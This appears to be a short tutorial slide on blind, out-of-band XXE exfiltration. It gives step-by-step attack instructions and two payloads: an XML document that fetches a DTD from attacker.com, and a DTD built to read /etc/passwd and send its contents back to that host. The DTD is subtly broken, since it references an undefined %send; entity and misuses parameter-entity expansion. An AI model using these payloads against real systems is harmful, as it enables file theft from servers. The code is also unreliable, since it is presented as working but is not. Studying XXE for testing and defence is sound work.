Out-of-Band (OOB) Data Exfiltration

Extracting data when direct response is not available.

OOB Exfiltration Process
  1. Initial Payload: Send XML to target, referencing an external DTD on attacker's server.
  2. Fetch Malicious DTD: Target server fetches `evil.dtd` from `attacker.com`.
  3. Define File Entity: `evil.dtd` defines an entity to read a local file (e.g., `/etc/passwd`).
  4. Construct Exfil URL: `evil.dtd` defines another entity to build a URL containing the file's content.
  5. Trigger Request: The target server makes an HTTP request to `attacker.com` with the sensitive data in the URL parameter.
Key Takeaway

OOB XXE is essential for blind exploitation, allowing data exfiltration even when the application doesn't reflect the XXE output directly.

OOB XXE Payloads
<!-- Initial XML Payload --> <?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd"> ]> <foo>&xxe;</foo>
<!-- evil.dtd hosted on attacker.com --> <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://attacker.com/?data=%file;"> %dtd; %send;

Pro Tip: Monitor your attacker-controlled server's access logs for incoming requests containing the exfiltrated data. Tools like `netcat` or a simple Python HTTP server can be used.
